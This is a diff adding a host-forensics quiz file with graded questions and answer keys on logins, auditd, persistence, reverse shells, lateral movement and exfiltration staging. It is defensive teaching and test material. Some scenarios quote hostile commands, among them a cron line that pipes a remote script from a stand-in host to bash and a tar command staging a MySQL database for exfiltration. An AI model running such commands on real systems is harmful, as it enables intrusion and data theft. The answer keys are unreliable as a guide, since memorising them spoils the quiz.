@@ -1,0 +1,168 @@
+# Quiz — host forensics (overlaps with the caution/ scenarios).
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Which command shows the most recent successful logins?"
+options = ["lastb", "last", "who -b", "dmesg"]
+answer = "1"
+hint = "lastb is about failed attempts."
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Many consecutive lines of 'Failed password for root from <IP>' are..."
+options = ["Legitimate user typos", "Brute force", "Log rotation", "An NTP problem"]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Which tool shows which process is holding a file open?"
+options = ["lsof", "ps aux", "top", "vmstat"]
+answer = "0"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The command that lists TCP sockets with the owning process PID (the modern netstat replacement). Include flags."
+answer = "ss -tnp"
+normalize = "casefold"
+accept = ["ss -tnlp", "ss -tunp", "ss -tp"]
+
+[[question]]
+level = "intermediate"
+kind = "choice"
+prompt = "A user always logged in from Latvia; now from Nigeria, and 2 minutes later from Germany. This is..."
+options = [
+  "A VPN switch",
+  "Impossible travel / a sign of account spoofing",
+  "A GeoIP database error",
+  "Normal for roaming",
+]
+answer = "1"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The Linux kernel subsystem whose events are written to /var/log/audit/audit.log (one word)."
+answer = "auditd"
+normalize = "casefold"
+accept = ["audit", "linux audit"]
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "An account's user-agent was always Chrome/Windows; a suspicious entry shows curl/8.7.1. This most strongly indicates..."
+options = [
+  "A browser update",
+  "Automated API access on behalf of a compromised account",
+  "A proxy problem",
+  "A legitimate backup script",
+]
+answer = "1"
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "An analyst sees an account accessing resources beyond its rights. Which mechanism does NOT directly explain this?"
+options = [
+  "privilege escalation",
+  "credential reuse",
+  "misconfigured permissions",
+  "scheduled SSH key rotation",
+]
+answer = "3"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Which command reads logs from the systemd journal?"
+options = ["journalctl", "syslogctl", "logread", "dmesg"]
+answer = "0"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "A cron job with 'curl http://ext/x.sh | bash' suddenly appears in www-data's crontab. This is most likely..."
+options = [
+  "a normal package auto-update",
+  "a persistence mechanism",
+  "log rotation",
+  "a scheduled backup",
+]
+answer = "1"
+
+[[question]]
+level = "beginner"
+kind = "choice"
+prompt = "Where do you add a public key to get passwordless SSH login as a user?"
+options = [
+  "~/.bashrc",
+  "~/.ssh/authorized_keys",
+  "~/.ssh/known_hosts",
+  "/etc/passwd",
+]
+answer = "1"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The utility for searching /var/log/audit/audit.log by key or record type (one word)."
+answer = "ausearch"
+normalize = "casefold"
+accept = ["aureport"]
+
+[[question]]
+level = "intermediate"
+kind = "choice"
+prompt = "auth.log shows 'sudo: alice : COMMAND=/bin/bash', then 'session opened for user root'. This is..."
+options = [
+  "legitimate privilege elevation via sudo",
+  "necessarily a compromise",
+  "a PAM module failure",
+  "a time desync",
+]
+answer = "0"
+
+[[question]]
+level = "intermediate"
+kind = "free"
+prompt = "The directory for systemd unit files where custom .service files for autostart are most often placed (full path)."
+answer = "/etc/systemd/system"
+normalize = "trim"
+accept = ["/lib/systemd/system", "/usr/lib/systemd/system", "/etc/systemd/system/"]
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "A process listens on 0.0.0.0:4444, its executable is in /tmp, and its parent is bash owned by www-data. This is most likely..."
+options = [
+  "a legitimate application service",
+  "a reverse/bind shell after RCE",
+  "a developer's debug server",
+  "an NTP client",
+]
+answer = "1"
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "auth.log: 'Accepted publickey for deploy from 10.0.0.5', then from 10.0.0.5 a login to 10.0.0.9 with the same account. This is an example of..."
+options = ["lateral movement", "privilege escalation", "defense evasion", "initial access"]
+answer = "0"
+
+[[question]]
+level = "advanced"
+kind = "free"
+prompt = "The permission bit that lets an executable run with its owner's privileges regardless of the caller (one word)."
+answer = "setuid"
+normalize = "casefold"
+accept = ["suid", "setuid bit", "suid bit"]
+
+[[question]]
+level = "advanced"
+kind = "choice"
+prompt = "bash_history contains 'tar czf /tmp/db.tgz /var/lib/mysql' just before an outbound connection to an external IP. This is which stage?"
+options = ["data staging before exfiltration", "privilege escalation", "persistence", "reconnaissance"]
+answer = "0"
